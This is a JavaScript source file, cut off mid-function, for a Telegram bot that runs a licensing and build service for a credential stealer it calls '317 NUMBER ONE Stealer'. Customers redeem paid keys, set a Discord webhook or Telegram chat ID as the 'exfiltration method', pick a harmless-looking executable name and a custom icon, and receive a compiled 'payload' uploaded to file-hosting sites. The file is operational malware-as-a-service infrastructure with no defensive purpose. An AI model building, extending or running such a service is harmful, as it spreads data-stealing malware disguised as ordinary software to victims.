// 317 NUMBER ONE - License & Builder Bot
require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const db = require('./src/database/db');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const sharp = require('sharp');
const pngToIco = require('png-to-ico').default || require('png-to-ico');

// Bot token from environment
const BOT_TOKEN = process.env.BUILDER_BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error('❌ BUILDER_BOT_TOKEN not found in .env file');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// User states for conversation flow
const userStates = new Map();

// Build queue management
const buildQueue = [];
let isProcessing = false;
let currentQueueNumber = 0;

/**
 * Format date
 */
function formatDate(dateString) {
  const date = new Date(dateString);
  return date.toLocaleString('en-US');
}

/**
 * Check if user is admin
 */
function checkAdmin(ctx) {
  const userId = String(ctx.from.id);
  if (!db.isAdmin(userId)) {
    ctx.reply('❌ You do not have permission to use this command. Admin only.');
    return false;
  }
  return true;
}

/**
 * Queue Management Functions
 */
function addToQueue(chatId, user, userData) {
  const queuePosition = buildQueue.length + 1;
  const queueItem = {
    chatId,
    user,
    userData,
    queueNumber: queuePosition,
    addedAt: new Date()
  };
  buildQueue.push(queueItem);
  console.log(`[Queue] Added user ${user.username} at position ${queuePosition}`);
  return queuePosition;
}

function removeFromQueue(userId) {
  const index = buildQueue.findIndex(item => item.user.id === userId);
  if (index !== -1) {
    buildQueue.splice(index, 1);
    buildQueue.forEach((item, idx) => {
      item.queueNumber = idx + 1;
    });
    console.log(`[Queue] Removed user ${userId}`);
  }
}

function getUserQueuePosition(userId) {
  return buildQueue.findIndex(item => item.user.id === userId) + 1;
}

/**
 * Get main menu keyboard
 */
function getMainMenu(userId) {
  const keyboard = [
    [
      { text: '🔑 Activate Key', callback_data: 'cmd_key' },
      { text: '📊 Key Status', callback_data: 'cmd_check' }
    ],
    [
      { text: '🔗 Set Webhook', callback_data: 'cmd_webhook' },
      { text: '💬 Set Chat ID', callback_data: 'cmd_chatid' }
    ],
    [
      { text: '📝 Set Exe Name', callback_data: 'cmd_exename' },
      { text: '🔨 Build', callback_data: 'cmd_build' }
    ],
    [
      { text: '📋 Queue Status', callback_data: 'cmd_queue' },
      { text: 'ℹ️ My Info', callback_data: 'cmd_myinfo' }
    ]
  ];

  if (db.isAdmin(userId)) {
    keyboard.push([{ text: '👑 Admin Panel', callback_data: 'cmd_admin_panel' }]);
  }

  return {
    reply_markup: {
      inline_keyboard: keyboard
    }
  };
}

/**
 * Start command
 */
bot.command('start', async (ctx) => {
  const userId = String(ctx.from.id);
  const username = ctx.from.username || ctx.from.first_name;

  console.log(`[Command] /start from @${username} (${userId})`);

  // Get or create customer
  db.getOrCreateCustomer(userId, username);

  let message = '🎯 <b>317 NUMBER ONE Stealer - License System</b>\n\n';
  message += 'Use the buttons below to interact with the bot.\n';

  ctx.replyWithHTML(message, getMainMenu(userId));
});

/**
 * Menu command
 */
bot.command('menu', async (ctx) => {
  const userId = String(ctx.from.id);
  console.log(`[Command] /menu from @${ctx.from.username} (${userId})`);
  await ctx.reply('📋 Main Menu:', getMainMenu(userId));
});

/**
 * Help command
 */
bot.command('help', (ctx) => {
  let message = '📖 <b>Help</b>\n\n';
  message += '<b>Building:</b>\n';
  message += '1. Start with /build command\n';
  message += '2. Enter a valid license key\n';
  message += '3. Set Webhook and Chat ID (first time)\n';
  message += '4. Set your exe name\n';
  message += '5. Build will be compiled\n\n';
  message += '<b>Settings:</b>\n';
  message += '/setwebhook - Discord webhook URL\n';
  message += '/setchatid - Telegram chat ID\n';
  message += '/setexename - Executable filename\n\n';
  message += '<b>Info:</b>\n';
  message += '/myinfo - View your current settings\n';

  ctx.replyWithHTML(message);
});

/**
 * Create key command (Admin only)
 */
bot.command('createkey', async (ctx) => {
  if (!checkAdmin(ctx)) return;

  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('1 Day', 'create_1day'),
      Markup.button.callback('3 Days', 'create_3days'),
      Markup.button.callback('7 Days', 'create_7days')
    ],
    [
      Markup.button.callback('1 Month', 'create_1month'),
      Markup.button.callback('3 Months', 'create_3months')
    ],
    [
      Markup.button.callback('1 Year', 'create_1year'),
      Markup.button.callback('Lifetime', 'create_lifetime')
    ]
  ]);

  ctx.reply('⏰ Select key duration:', keyboard);
});

/**
 * Handle key creation
 */
bot.action(/^create_(.+)$/, async (ctx) => {
  if (!checkAdmin(ctx)) return;

  const durationType = ctx.match[1];
  userStates.set(ctx.from.id, { action: 'create_key', durationType });

  await ctx.answerCbQuery();
  ctx.reply('🔢 How many keys to generate? (1-50)');
});

/**
 * Delete key command (Admin only)
 */
bot.command('deletekey', async (ctx) => {
  if (!checkAdmin(ctx)) return;

  userStates.set(ctx.from.id, { action: 'delete_key' });
  ctx.reply('🗑 Enter the key code to delete:');
});

/**
 * List keys command (Admin only)
 */
bot.command('listkeys', async (ctx) => {
  if (!checkAdmin(ctx)) return;

  const keys = db.getAllKeys();

  if (keys.length === 0) {
    ctx.reply('📭 No keys generated yet.');
    return;
  }

  let message = `🔑 <b>All Keys (${keys.length})</b>\n\n`;

  keys.slice(0, 20).forEach((key, index) => {
    const status = key.isUsed ? '✅ Used' :
      new Date(key.expiresAt) < new Date() ? '⏰ Expired' :
        '🟢 Active';

    message += `<b>${index + 1}.</b> <code>${key.keyCode}</code>\n`;
    message += `   Duration: ${key.durationType}\n`;
    message += `   Status: ${status}\n`;
    if (key.usedBy) message += `   Used by: @${key.usedBy}\n`;
    message += `   Expires: ${formatDate(key.expiresAt)}\n\n`;
  });

  if (keys.length > 20) {
    message += `\n... and ${keys.length - 20} more keys`;
  }

  ctx.replyWithHTML(message);
});

/**
 * Customers command (Admin only)
 */
bot.command('customers', async (ctx) => {
  if (!checkAdmin(ctx)) return;

  const customers = db.getAllCustomers();

  if (customers.length === 0) {
    ctx.reply('📭 No customers yet.');
    return;
  }

  let message = `👥 <b>Customers (${customers.length})</b>\n\n`;

  customers.slice(0, 15).forEach((customer, index) => {
    const activeKey = db.getCustomerActiveKey(customer.id);
    let keyStatus = '🔴 No active key';
    if (activeKey) {
      const exp = new Date(activeKey.expiresAt);
      const now = new Date();
      const daysLeft = Math.ceil((exp - now) / (1000 * 60 * 60 * 24));
      keyStatus = `🟢 <code>${activeKey.keyCode}</code> (${activeKey.durationType}, ${daysLeft}d left)`;
    }
    message += `<b>${index + 1}.</b> @${customer.username || 'Unknown'}\n`;
    message += `   ID: <code>${customer.telegramId}</code>\n`;
    message += `   🔑 ${keyStatus}\n`;
    message += `   Builds: ${customer.totalBuilds}\n`;
    message += `   Registered: ${formatDate(customer.createdAt)}\n\n`;
  });

  if (customers.length > 15) {
    message += `\n... and ${customers.length - 15} more customers`;
  }

  ctx.replyWithHTML(message);
});

/**
 * Stats command (Admin only)
 */
bot.command('stats', async (ctx) => {
  if (!checkAdmin(ctx)) return;

  const stats = db.getStatistics();

  let message = '📊 <b>Statistics</b>\n\n';
  message += `🔑 <b>Keys:</b>\n`;
  message += `   Total: ${stats.totalKeys}\n`;
  message += `   Active: ${stats.activeKeys}\n`;
  message += `   Used: ${stats.usedKeys}\n`;
  message += `   Expired: ${stats.expiredKeys}\n\n`;
  message += `👥 <b>Customers:</b> ${stats.totalCustomers}\n`;
  message += `📦 <b>Total Builds:</b> ${stats.totalBuilds}\n`;

  ctx.replyWithHTML(message);
});

/**
 * Build command
 */
bot.command('build', async (ctx) => {
  const userId = String(ctx.from.id);
  const username = ctx.from.username || ctx.from.first_name;
  const customer = db.getCustomer(userId);

  console.log(`[Command] /build from @${username} (${userId})`);

  if (!customer) {
    console.log(`[Command] User not registered: ${userId}`);
    ctx.reply('❌ Önce /start komutu ile kayıt olun.');
    return;
  }

  console.log(`[Command] Customer found: ${customer.username} (ID: ${customer.id})`);

  // Check if customer already has an active key and all settings
  const activeKey = db.getCustomerActiveKey(customer.id);

  if (activeKey && customer.webhook_url && customer.telegram_chat_id && customer.exe_name) {
    console.log(`[Command] Active key found: ${activeKey.keyCode}, all settings present — asking method`);

    // Redirect to method selection (which will then ask icon question)
    return ctx.replyWithHTML(
      '💎 <b>EXFILTRATION METHOD</b>\n\n<blockquote>📡 Select your preferred data delivery channel for the payload.</blockquote>',
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💬 Telegram Log', callback_data: 'build_method_telegram' },
              { text: '🌐 Discord Log', callback_data: 'build_method_discord' }
            ],
            [{ text: '� Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
          ]
        }
      }
    );
  }

  // If customer has active key but missing settings, guide through settings
  if (activeKey) {
    console.log(`[Command] Active key found but missing settings`);

    if (!customer.webhook_url) {
      userStates.set(ctx.from.id, { action: 'build_set_webhook', keyCode: activeKey.keyCode });
      ctx.reply('🔑 Active key found!\n\n🔗 Please set your Discord webhook URL first:\n\nExample: https://discord.com/api/webhooks/...');
      return;
    }

    if (!customer.telegram_chat_id) {
      userStates.set(ctx.from.id, { action: 'build_set_chatid', keyCode: activeKey.keyCode });
      ctx.reply('🔑 Active key found!\n\n💬 Please set your Telegram Chat ID:\n\nExample: 123456789');
      return;
    }

    if (!customer.exe_name) {
      userStates.set(ctx.from.id, { action: 'build_set_exename', keyCode: activeKey.keyCode });
      ctx.reply('🔑 Aktif keyiniz bulundu!\n\n📝 Exe dosya ismini girin:');
      return;
    }
  }

  // No active key — ask for a new one
  userStates.set(ctx.from.id, { action: 'build_start' });
  ctx.reply(
    '💎 <b>License Authentication</b>\n\n<blockquote>🛡️ Please enter your <code>premium key code</code> below to proceed.</blockquote>',
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]
        ]
      }
    }
  );
});

/**
 * Set webhook command
 */
bot.command('setwebhook', async (ctx) => {
  const userId = String(ctx.from.id);
  userStates.set(ctx.from.id, { action: 'set_webhook' });
  ctx.reply('💎 <b>WEBHOOK INITIALIZATION</b>\n\n<blockquote>🌐 Please provide your <code>Discord Webhook URL</code> below to establish a secure data stream.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
});

/**
 * Set chat ID command
 */
bot.command('setchatid', async (ctx) => {
  const userId = String(ctx.from.id);
  userStates.set(ctx.from.id, { action: 'set_chatid' });
  ctx.reply('💎 <b>CHAT ID CONFIGURATION</b>\n\n<blockquote>💬 Enter your <code>Telegram Chat ID</code> below to route notifications securely.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
});

/**
 * Set exe name command
 */
bot.command('setexename', async (ctx) => {
  const userId = String(ctx.from.id);
  userStates.set(ctx.from.id, { action: 'set_exename' });
  ctx.reply('💎 <b>SET EXE NAME</b>\n\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
});

/**
 * My info command
 */
bot.command('myinfo', async (ctx) => {
  const userId = String(ctx.from.id);
  const customer = db.getCustomer(userId);

  if (!customer) {
    ctx.reply('❌ Please register first with /start command.');
    return;
  }

  const builds = db.getCustomerBuilds(customer.id);

  let message = '👤 <b>My Info</b>\n\n';
  message += `<b>Username:</b> @${customer.username}\n`;
  message += `<b>Telegram ID:</b> <code>${customer.telegramId}</code>\n\n`;
  message += `<b>Settings:</b>\n`;
  message += `Webhook: ${customer.webhook_url ? '✅ Configured' : '❌ Not set'}\n`;
  message += `Chat ID: ${customer.telegram_chat_id ? '✅ Configured' : '❌ Not set'}\n`;
  message += `Exe Name: ${customer.exe_name}\n\n`;
  message += `<b>Total Builds:</b> ${builds.length}\n`;
  message += `<b>Registered:</b> ${formatDate(customer.createdAt)}\n`;

  ctx.replyWithHTML(message);
});

/**
 * Handle text messages (conversation flow)
 */
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  const state = userStates.get(userId);

  if (!state) return;

  try {
    // Admin: Create key
    if (state.action === 'create_key') {
      const count = parseInt(text);

      if (isNaN(count) || count < 1 || count > 50) {
        ctx.reply('❌ <b>Invalid Input:</b> Please enter a valid number between 1 and 50.', { parse_mode: 'HTML' });
        return;
      }

      const keys = db.createKey(state.durationType, count);

      let message = `✅ <b>Successfully generated ${count} key(s)!</b>\n\n`;
      keys.forEach((key, index) => {
        message += `<code>${key.keyCode}</code>\n`;
      });
      message += `\n<b>Duration:</b> ${state.durationType}\n`;
      message += `<b>Expires At:</b> ${formatDate(keys[0].expiresAt)}`;

      ctx.replyWithHTML(message);
      userStates.delete(userId);
    }

    // Admin: Delete key
    else if (state.action === 'delete_key') {
      const keyCode = text.trim();
      const deleted = db.deleteKey(keyCode);

      if (deleted) {
        ctx.reply(`✅ <b>Key Terminated:</b> <code>${keyCode}</code>`, { parse_mode: 'HTML' });
      } else {
        ctx.reply('❌ <b>Not Found:</b> The specified key code does not exist.', { parse_mode: 'HTML' });
      }

      userStates.delete(userId);
    }

    // User: Activate key (separate from build)
    else if (state.action === 'activate_key') {
      const keyCode = text.trim();
      console.log(`[Activate] Key validation: ${keyCode}`);

      if (!db.validateKey(keyCode)) {
        console.log(`[Activate] ❌ Invalid key: ${keyCode}`);
        ctx.reply('❌ <b>Authentication Failed:</b> Invalid, used, or expired key code.', { parse_mode: 'HTML' });
        userStates.delete(userId);
        return;
      }

      const customer = db.getCustomer(String(userId));
      db.useKey(keyCode, customer.id);
      const keyInfo = db.getKeyInfo(keyCode);

      console.log(`[Activate] ✅ Key activated: ${keyCode} for ${customer.username}`);

      ctx.replyWithHTML(
        `✅ <b>LICENSE ACTIVATED</b>\n\n<blockquote>🔑 <b>Key:</b> <code>${keyCode}</code>\n📅 <b>Duration:</b> <code>${keyInfo.durationType}</code>\n⏰ <b>Expires:</b> <i>${formatDate(keyInfo.expiresAt)}</i></blockquote>\n\n<i>You can now configure your settings and build.</i>`,
        getMainMenu(String(userId))
      );
      userStates.delete(userId);
    }

    // User: Build - validate key
    else if (state.action === 'build_start') {
      const keyCode = text.trim();

      console.log(`[Build Flow] Key validation: ${keyCode}`);

      if (!db.validateKey(keyCode)) {
        console.log(`[Build Flow] ❌ Invalid key: ${keyCode}`);
        ctx.reply('❌ <b>Authentication Failed:</b> Invalid, used, or expired key code.', { parse_mode: 'HTML' });
        userStates.delete(userId);
        return;
      }

      console.log(`[Build Flow] ✅ Key valid: ${keyCode}`);

      const customer = db.getCustomer(String(userId));

      console.log(`[Build Flow] Customer: ${customer.username}`);
      console.log(`[Build Flow] Webhook: ${customer.webhook_url ? 'Set' : 'Not set'}`);
      console.log(`[Build Flow] Chat ID: ${customer.telegram_chat_id ? 'Set' : 'Not set'}`);

      // Check based on method
      const missingWebhook = state.method === 'discord' && !customer.webhook_url;
      const missingChatId = state.method === 'telegram' && !customer.telegram_chat_id;

      if (missingWebhook) {
        console.log(`[Build Flow] Webhook not set, asking user`);
        userStates.set(userId, { action: 'build_set_webhook', keyCode, method: state.method });
        ctx.reply('💎 <b>WEBHOOK INITIALIZATION</b>\n\n<blockquote>🌐 Please provide your <code>Discord Webhook URL</code> below to establish a secure data stream.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
        return;
      }

      if (missingChatId) {
        console.log(`[Build Flow] Chat ID not set, asking user`);
        userStates.set(userId, { action: 'build_set_chatid', keyCode, method: state.method });
        ctx.reply('💎 <b>CHAT ID CONFIGURATION</b>\n\n<blockquote>💬 Enter your <code>Telegram Chat ID</code> below to route notifications securely.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
        return;
      }

      // Ask for exe name
      console.log(`[Build Flow] All settings OK, asking for exe name`);
      userStates.set(userId, { action: 'build_set_exename', keyCode, method: state.method });
      ctx.reply('💎 <b>SET EXE NAME</b>\n\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
    }

    // User: Build - set webhook
    else if (state.action === 'build_set_webhook') {
      const webhookUrl = text.trim();

      if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        ctx.reply('❌ <b>Invalid Webhook:</b> Please enter a valid Discord webhook URL.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerWebhook(String(userId), webhookUrl);

      userStates.set(userId, { action: 'build_set_exename', keyCode: state.keyCode, method: state.method });
      ctx.reply('✅ <b>Webhook configured!</b>\n\n💎 <b>SET EXE NAME</b>\n\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
    }

    // User: Build - set chat ID
    else if (state.action === 'build_set_chatid') {
      const chatId = text.trim();

      if (!/^\d+$/.test(chatId)) {
        ctx.reply('❌ <b>Invalid ID:</b> Chat ID must contain only numbers.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerChatId(String(userId), chatId);

      const customer = db.getCustomer(String(userId));
      userStates.set(userId, { action: 'build_set_exename', keyCode: state.keyCode, method: state.method });
      ctx.reply('✅ <b>Chat ID configured!</b>\n\n💎 <b>SET EXE NAME</b>\n\n<blockquote>📝 Enter the desired filename for your executable.\n\n💡 <b>Examples:</b> <code>setup</code>, <code>loader</code>, <code>runtime</code>\n⚠️ <b>Rules:</b> Letters, numbers, <code>-</code> and <code>_</code> only</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'cmd_menu' }]] } });
    }

    // User: Build - set exe name and start build
    else if (state.action === 'build_set_exename') {
      const exeName = text.trim().replace(/[^a-zA-Z0-9_-]/g, '');

      console.log(`[Build Flow] Exe name entered: ${exeName}`);

      if (!exeName) {
        console.log(`[Build Flow] ❌ Invalid exe name`);
        ctx.reply('❌ <b>Invalid Name:</b> Alphanumeric characters only.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerExeName(String(userId), exeName);
      console.log(`[Build Flow] ✅ Exe name updated: ${exeName}`);

      const customer = db.getCustomer(String(userId));
      const activeKey = db.getCustomerActiveKey(customer.id);

      // If key came from build_start flow (not yet activated), activate it now
      if (state.keyCode && !activeKey) {
        db.useKey(state.keyCode, customer.id);
      }

      const buildKey = activeKey || db.getKeyInfo(state.keyCode);

      console.log(`[Build Flow] Recording build in database`);
      // Record build
      db.recordBuild(customer.id, buildKey.id, exeName, customer.webhook_url, customer.telegram_chat_id);

      ctx.reply('💎 <b>BUILD PROCESS STARTED</b>\n\n<blockquote>⏳ Compilation may take 2-5 minutes. Please wait...</blockquote>', { parse_mode: 'HTML' });

      console.log(`[Build Flow] Starting build process...`);
      // Start build process
      startBuild(ctx, customer, exeName, state.method);

      userStates.delete(userId);
    }

    // User: Set webhook
    else if (state.action === 'set_webhook') {
      const webhookUrl = text.trim();

      if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        ctx.reply('❌ <b>Invalid Webhook:</b> Please enter a valid Discord webhook URL.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerWebhook(String(userId), webhookUrl);
      ctx.reply('✅ <b>Webhook configured successfully!</b>', { parse_mode: 'HTML' });
      userStates.delete(userId);
    }

    // User: Set chat ID
    else if (state.action === 'set_chatid') {
      const chatId = text.trim();

      if (!/^\d+$/.test(chatId)) {
        ctx.reply('❌ <b>Invalid ID:</b> Chat ID must contain only numbers.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerChatId(String(userId), chatId);
      ctx.reply('✅ <b>Chat ID configured successfully!</b>', { parse_mode: 'HTML' });
      userStates.delete(userId);
    }

    // User: Set exe name
    else if (state.action === 'set_exename') {
      const exeName = text.trim().replace(/[^a-zA-Z0-9_-]/g, '');

      if (!exeName) {
        ctx.reply('❌ <b>Invalid Name:</b> Alphanumeric characters only.', { parse_mode: 'HTML' });
        return;
      }

      db.updateCustomerExeName(String(userId), exeName);
      ctx.reply(`✅ <b>Executable name assigned successfully:</b> <code>${exeName}</code>`, { parse_mode: 'HTML' });
      userStates.delete(userId);
    }

  } catch (error) {
    console.error('Error handling message:', error);
    ctx.reply('❌ <b>System Error:</b> Please try your request again.', { parse_mode: 'HTML' });
    userStates.delete(userId);
  }
});

/**
 * Handle photo messages (custom icon upload)
 */
bot.on(['photo', 'document'], async (ctx) => {
  const userId = ctx.from.id;
  const state = userStates.get(userId);

  if (!state || state.action !== 'awaiting_icon_upload') return;

  try {
    let fileId = null;

    // Handle photo (compressed by Telegram — pick largest size)
    if (ctx.message.photo && ctx.message.photo.length > 0) {
      fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
    }
    // Handle document (uncompressed image file)
    else if (ctx.message.document) {
      const mime = ctx.message.document.mime_type || '';
      if (mime.startsWith('image/')) {
        fileId = ctx.message.document.file_id;
      } else {
        await ctx.reply('❌ <b>Invalid file type.</b> Please send an image file (PNG, JPG, BMP, WEBP).', { parse_mode: 'HTML' });
        return;
      }
    }

    if (!fileId) {
      await ctx.reply('❌ <b>Could not read the image.</b> Please try again.', { parse_mode: 'HTML' });
      return;
    }

    await ctx.reply('⏳ <i>Processing your icon...</i>', { parse_mode: 'HTML' });

    // Download file from Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer', timeout: 30000 });
    const imgBuffer = Buffer.from(response.data);

    console.log(`[Icon] Downloaded image: ${imgBuffer.length} bytes`);

    // Resize to 256x256 PNG using sharp
    const pngBuffer = await sharp(imgBuffer)
      .resize(256, 256, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
      .png()
      .toBuffer();

    console.log(`[Icon] Resized to 256x256 PNG: ${pngBuffer.length} bytes`);

    // Convert PNG to ICO
    const icoBuffer = await pngToIco(pngBuffer);

    console.log(`[Icon] Converted to ICO: ${icoBuffer.length} bytes`);

    // Save as build/resources/icon.ico
    const iconPath = path.join(__dirname, 'build', 'resources', 'icon.ico');
    fs.writeFileSync(iconPath, icoBuffer);

    console.log(`[Icon] ✅ Custom icon saved to: ${iconPath}`);

    await ctx.reply('✅ <b>Custom icon applied!</b> (256×256 ICO)', { parse_mode: 'HTML' });

    // Continue build flow
    const method = state.method;
    const chatId = ctx.message.chat.id;
    return continueAfterIcon(ctx, chatId, userId, method);

  } catch (error) {
    console.error('[Icon] Error processing icon:', error);
    await ctx.reply('❌ <b>Icon processing failed:</b> ' + error.message + '\n\nUsing default icon instead.', { parse_mode: 'HTML' });

    // Continue with default icon
    const method = state.method;
    const chatId = ctx.message.chat.id;
    return continueAfterIcon(ctx, chatId, userId, method);
  }
});

/**
 * Upload file to Gofile CDN
 */
async function uploadToGofile(filePath, fileName) {
  try {
    console.log('[Gofile] Starting upload...');
    console.log('[Gofile] File:', filePath);
    console.log('[Gofile] Filename:', fileName);

    // Step 1: Get best server (with retry)
    let servers = [];
    try {
      const serverResponse = await axios.get('https://api.gofile.io/servers', { timeout: 30000 });
      if (serverResponse.data && serverResponse.data.status === 'ok' && serverResponse.data.data && serverResponse.data.data.servers) {
        servers = serverResponse.data.data.servers.map(s => s.name);
      }
    } catch (e) {
      console.log('[Gofile] Server list fetch failed, using fallback servers');
    }

    if (servers.length === 0) {
      servers = ['store1', 'store2', 'store3', 'store4', 'store5', 'store6'];
    }

    console.log('[Gofile] Available servers:', servers.join(', '));

    // Step 2: Try max 3 servers with stall detection
    let lastError = null;
    const maxTries = Math.min(servers.length, 3);
    for (let i = 0; i < maxTries; i++) {
      const server = servers[i];
      try {
        console.log(`[Gofile] Trying server: ${server}... (${i+1}/${maxTries})`);
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath), {
          filename: fileName,
          contentType: 'application/octet-stream'
        });

        let lastProgress = Date.now();
        const cancelSource = axios.CancelToken.source();

        // Stall detector: if no progress for 30 seconds, cancel
        const stallTimer = setInterval(() => {
          if (Date.now() - lastProgress > 30000) {
            clearInterval(stallTimer);
            cancelSource.cancel('Upload stalled - no progress for 30s');
          }
        }, 5000);

        const uploadResponse = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
          headers: { ...form.getHeaders() },
          timeout: 120000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
          cancelToken: cancelSource.token,
          onUploadProgress: (progressEvent) => {
            lastProgress = Date.now();
            const pct = progressEvent.total ? Math.round((progressEvent.loaded / progressEvent.total) * 100) : '?';
            console.log(`[Gofile] ${server}: ${pct}% (${Math.round(progressEvent.loaded / 1024 / 1024)} MB)`);
          }
        });

        clearInterval(stallTimer);

        if (uploadResponse.data && uploadResponse.data.status === 'ok' && uploadResponse.data.data.downloadPage) {
          const downloadUrl = uploadResponse.data.data.downloadPage;
          console.log('[Gofile] ✅ Upload successful →', downloadUrl);
          return downloadUrl;
        }
      } catch (err) {
        lastError = err;
        console.log(`[Gofile] Server ${server} failed: ${err.message}`);
      }
    }

    throw new Error(lastError ? lastError.message : 'All Gofile servers failed');
  } catch (error) {
    console.error('[Gofile] ❌ Upload failed:', error.message);
    throw error;
  }
}



/**
 * Upload file to file.io (backup CDN)
 */
async function uploadToFileIO(filePath, fileName) {
  try {
    console.log('[file.io] Starting upload...');
    const form = new FormData();
    form.append('file', fs.createReadStream(filePath), {
      filename: fileName,
      contentType: 'application/octet-stream'
    });

    const response = await axios.post('https://file.io/?expires=3d', form, {
      headers: { ...form.getHeaders() },
      timeout: 300000,
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      onUploadProgress: (progressEvent) => {
        if (progressEvent.total) {
          const pct = Math.round((progressEvent.loaded / progressEvent.total) * 100);
          if (pct % 20 === 0) console.log(`[file.io] ${pct}%`);
        }
      }
    });

    if (response.data && response.data.success && response.data.link) {
      console.log('[file.io] ✅ Upload successful →', response.data.link);
      return response.data.link;
    }
    throw new Error('file.io: no link in response');
  } catch (error) {
    console.error('[file.io] ❌ Upload failed:', error.message);
    throw error;
  }
}

/**
 * Multi-CDN upload with automatic fallback
 * Order: Gofile → file.io
 */
async function uploadWithFallback(filePath, fileName) {

  // Try Gofile
  try {
    return await uploadToGofile(filePath, fileName);
  } catch (e) {
    console.log('[Upload] Gofile failed, trying file.io...');
  }

  // Try file.io last
  try {
    return await uploadToFileIO(filePath, fileName);
  } catch (e) {
    console.log('[Upload] file.io failed — all CDN uploads exhausted');
  }

  return null;
}

// Default icon path for backup/restore
const DEFAULT_ICON_PATH = path.join(__dirname, 'build', 'resources', 'icon.ico');
const DEFAULT_ICON_BACKUP = path.join(__dirname, 'build', 'resources', 'icon_default.ico');

// Backup default icon on first run
if (fs.existsSync(DEFAULT_ICON_PATH) && !fs.existsSync(DEFAULT_ICON_BACKUP)) {
  fs.copyFileSync(DEFAULT_ICON_PATH, DEFAULT_ICON_BACKUP);
}

/**
 * Continue build flow after icon choice (yes/no)
 */
async function continueAfterIcon(ctx, chatId, userId, method) {
  userStates.delete(userId);
  const customer = db.getCustomer(String(userId));

  if (!customer) {
    return bot.telegram.sendMessage(chatId, '❌ Please register first with /start command.', getMainMenu());
  }

  const activeKey = db.getCustomerActiveKey(customer.id);

  // Check method-specific requirements
  const missingWebhook = method === 'discord' && !customer.webhook_url;
  const missingChatId = method === 'telegram' && !customer.telegram_chat_id;

  if (activeKey && !missingWebhook && !missingChatId && customer.exe_name) {
    // Ready to build directly
    const exeName = customer.exe_name;
    db.recordBuild(customer.id, activeKey.id, exeName, customer.webhook_url, customer.telegram_chat_id);

    await bot.telegram.sendMessage(chatId,
      `💎 <b>BUILD INITIALIZATION</b>\n\n<blockquote>🚀 <i>Compiling payload with active configuration...</i>\n\n🔑 <b>Key:</b> <code>${activeKey.keyCode}</code>\n🏷️ <b>Payload:</b> <code>${exeName}</code>\n📡 <b>Method:</b> <code>${method.toUpperCase()}</code>\n\n⏳ <i>Estimated time: 2-5 minutes</i></blockquote>`, { parse_mode: 'HTML' }
    );

    startBuild(ctx, customer, exeName, method);
    return;
  }

  // If active key exists but settings are missing
  if (activeKey) {
    if (missingWebhook) {
      userStates.set(userId, { action: 'build_set_webhook', keyCode: activeKey.keyCode, method });
      return bot.telegram.sendMessage(chatId, '💎 <b>WEBHOOK INITIALIZATION</b>\n\n<blockquote>🌐 Please provide your <code>Discord Webhook URL</code> below to establish a secure data stream.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
    }

    if (missingChatId) {
      userStates.set(userId, { action: 'build_set_chatid', keyCode: activeKey.keyCode, method });
      return bot.telegram.sendMessage(chatId, '💎 <b>CHAT ID CONFIGURATION</b>\n\n<blockquote>💬 Enter your <code>Telegram Chat ID</code> below to route notifications securely.</blockquote>', { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 Cancel & Return to Dashboard', callback_data: 'cmd_menu' }]] } });
    }

    if (!customer.exe_name) {
